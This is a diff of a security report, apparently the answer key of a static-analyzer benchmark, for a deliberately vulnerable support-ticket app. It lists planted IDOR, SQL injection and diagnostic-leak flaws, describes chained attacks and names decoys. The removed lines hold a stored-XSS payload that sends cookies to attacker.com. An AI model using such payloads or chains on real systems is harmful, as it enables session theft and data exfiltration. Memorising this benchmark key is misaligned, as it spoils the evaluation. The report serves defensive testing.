@@ -1,117 +1,112 @@
-# Security Report: app-32-support-tickets
+# Security Report: app-32 — Customer Support Ticket System
 
-## Application Information
-
-- **App ID**: app-32
-- **App Name**: Support Ticket System
-- **Language**: TypeScript
-- **Framework**: Express
-- **Source**: `apps/typescript/app-32-support-tickets/`
+**Language:** Typescript (Express)
+**Directory:** `apps/typescript/app-32-support-tickets`
 
 ---
+
+## Application Information
+- **App ID:** app-32
+- **Name:** Customer Support Ticket System
+- **Language:** Typescript
+- **Framework:** Express
 
 ## Vulnerability Summary
 
+The following vulnerability list represents the ground truth security issues identified for this application:
+
 | ID | OWASP | Category | Severity | Location | CWE |
 |---|---|---|---|---|---|
-| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/tickets/:id` (lines 146-162) | CWE-639 |
-| V2 | A03 | Injection | High | `src/index.ts` → `POST /api/tickets` (lines 163-178) | CWE-79 |
-| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `POST /api/admin/tickets/:id/close` (lines 181-197) | CWE-778 |
-
-### V1: IDOR on Ticket Details
-
-**OWASP Category**: A01 — Broken Access Control
-
-**Description**: Viewing support ticket details by ID lacks verification of user ownership, allowing any authenticated user to retrieve another customer's ticket information.
-
-**Endpoint**: `GET /api/tickets/:id`
-
-**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
-
-**Impact**: Medium — Any authenticated user can enumerate ticket IDs to view sensitive customer support interactions and private account details.
-
-**Detection**: Look for absence of ownership checks where the `:id` parameter is used to query tickets without verifying `req.user.id` against the ticket's customer ID.
+| V1 | A01 | Broken Access Control | Medium | src/index.ts | CWE-639 |
+| V2 | A03 | Injection | High | src/index.ts | CWE-89 |
+| V3 | A05 | Security Misconfiguration | Medium | src/index.ts | CWE-209 |
 
 ---
 
-### V2: Stored XSS in Ticket Creation
+## Standalone Vulnerabilities
 
-**OWASP Category**: A03 — Injection
+### VULN-01: A01 — Broken Access Control
 
-**Description**: Customer ticket descriptions are stored and rendered without HTML encoding, enabling stored cross-site scripting.
+- **Severity:** Medium
+- **Location:** `src/index.ts`:180-201 (method: `GET /api/tickets/:id`)
+- **CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
 
-**Endpoint**: `POST /api/tickets`
+#### Description
+The ticket detail retrieval endpoint fails to verify if the requesting user owns the ticket or possesses admin permissions, allowing authenticated users to access arbitrary tickets.
 
-**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+### VULN-02: A03 — Injection
 
-**Impact**: High — An attacker can inject malicious JavaScript in a ticket description. When support agents view the ticket, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.
+- **Severity:** High
+- **Location:** `src/index.ts`:165-177 (method: `GET /api/tickets/search`)
+- **CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
 
-**Detection**: Look for ticket description fields being stored as raw HTML and served to admin/support endpoints without sanitization.
+#### Description
+The search query parameter is directly concatenated into a raw SQL query statement, leading to SQL injection.
+
+### VULN-03: A05 — Security Misconfiguration
+
+- **Severity:** Medium
+- **Location:** `src/index.ts`:204-224 (method: `GET /api/system/health`)
+- **CWE:** [CWE-209](https://cwe.mitre.org/data/definitions/209.html)
+
+#### Description
+An endpoint exposes diagnostic info and verbose environment variables (including administrative recovery token and cookie secret) when requesting the system health status with diagnostic mode.
+
 
 ---
 
-### V3: Missing Audit Log on Ticket Closure
+## Chained Attack Scenarios
 
-**OWASP Category**: A09 — Security Logging and Monitoring Failures
+Chained scenarios represent multiple code-level weaknesses that, when exploited in sequence, lead to high-impact outcomes.
 
-**Description**: Closing support tickets at the admin level produces no audit logs, leaving state modifications untracked.
+### CHAIN-01: Verbose Diagnostics Exposure → Administrative Ticket Export Bypass
 
-**Endpoint**: `POST /api/admin/tickets/:id/close`
+- **Combined Impact:** `db_exfiltration`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy`
 
-**CWE**: CWE-778 (Insufficient Logging)
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-**Impact**: Low — Malicious closure of customer tickets cannot be traced or investigated.
+#### Attack Narrative
+An attacker queries the health diagnostics endpoint `/api/system/health?diagnostics=true` to leak the system configuration containing the hardcoded recovery key `SUPPORT-ADMIN-DEV-RECOVERY-KEY-2026`. The attacker then invokes the endpoint `/api/admin/export` passing this key in the `x-admin-token` header, enabling them to bulk export all tickets and users from the database.
 
-**Detection**: Check the close handler for any logging, audit trail, or notification mechanism before/after performing the closure operation.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | System diagnostics endpoint leaks secret admin recovery token. | Medium | A05 | CWE-209 | src/index.ts | `GET /api/system/health` |
+| 2 | Admin export endpoint allows data exfiltration by verifying only the leaked recovery key. | Medium | A01 | CWE-306 | src/index.ts | `POST /api/admin/export` |
 
----
+### CHAIN-02: Subtle Auth Session Pivot To Idor
 
-## Chained Attack Scenario
+- **Combined Impact:** `db_exfiltration`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy` `secondary_chain`
 
-### Chain: "Stored XSS Ticket Hijack → IDOR Ticket Exfiltration"
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-**Impact**: `account_takeover`
+#### Attack Narrative
+Attacker combines a low-visibility entry point with stored or derived application state, then pivots to a higher-impact sink that is reachable only after following the cross-file flow.
 
-**Overview**: An attacker creates a ticket with malicious JavaScript that steals a support agent's session, then uses that session to access other customers' tickets via IDOR.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | An endpoint exposes diagnostic info and verbose environment variables (including administrative recovery token and cookie secret) when requesting the system health status with diagnostic mode. | Medium | A05 | CWE-209 | src/index.ts | `GET /api/system/health` |
+| 2 | The search query parameter is directly concatenated into a raw SQL query statement, leading to SQL injection. | High | A03 | CWE-89 | src/index.ts | `GET /api/tickets/search` |
+| 3 | The ticket detail retrieval endpoint fails to verify if the requesting user owns the ticket or possesses admin permissions, allowing authenticated users to access arbitrary tickets. | Medium | A01 | CWE-639 | src/index.ts | `GET /api/tickets/:id` |
 
-**Components**:
-
-| Step | Issue | Severity | OWASP | CWE | Location |
-|---|---|---|---|---|---|
-| 1 | Stored XSS in ticket descriptions enables session cookie theft | Medium | A03 | CWE-79 | `POST /api/tickets` |
-| 2 | Ticket detail endpoint permits IDOR exfiltration of sensitive data | Medium | A01 | CWE-639 | `GET /api/tickets/:id` |
-
-**Attack Narrative**:
-1. The attacker creates a support ticket with a description containing `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
-2. When a support agent views the ticket, the XSS payload executes in their browser, exfiltrating their admin session cookie.
-3. Using the hijacked session, the attacker queries `GET /api/tickets/5` through IDOR to view other customers' tickets containing PII and account details.
-
-**Combined Impact**: Account takeover — An attacker can steal support agent sessions and exfiltrate customer data by chaining stored XSS with IDOR.
 
 ---
 
 ## Decoys (False-Positive Candidates)
 
+These code patterns mimic security weaknesses but are safe. They are included to measure static analyzer precision:
+
 | Location | Description |
 |---|---|
-| `src/index.ts` | Proper user scoping in `GET /api/tickets` limiting results to own tickets only |
-| `src/index.ts` | Proper parameterized query logic in `POST /api/tickets/:id/comments` |
-
----
-
-## Detection Commands
-
-```bash
-# Find IDOR on ticket details
-grep -n "tickets.*:id\|findOne\|findById" apps/typescript/app-32-support-tickets/src/index.ts
-
-# Find XSS in ticket creation
-grep -n "description\|comment\|<script\|innerHTML" apps/typescript/app-32-support-tickets/src/index.ts
-
-# Find missing audit logs on closure
-grep -n "close\|ticket\|log\|audit" apps/typescript/app-32-support-tickets/src/index.ts
-```
-
----
-
-*Report generated from `.vulns` manifest for app-32-support-tickets*
+| src/index.ts | Proper Bcrypt hashing for password storage and credentials validation during user login. |
+| src/index.ts | Proper parameterized query logic in POST /api/tickets to insert new tickets safely. |
+| src/index.ts | Proper authentication and authorization check in GET /api/users/profile to ensure users only access their own profile details. |
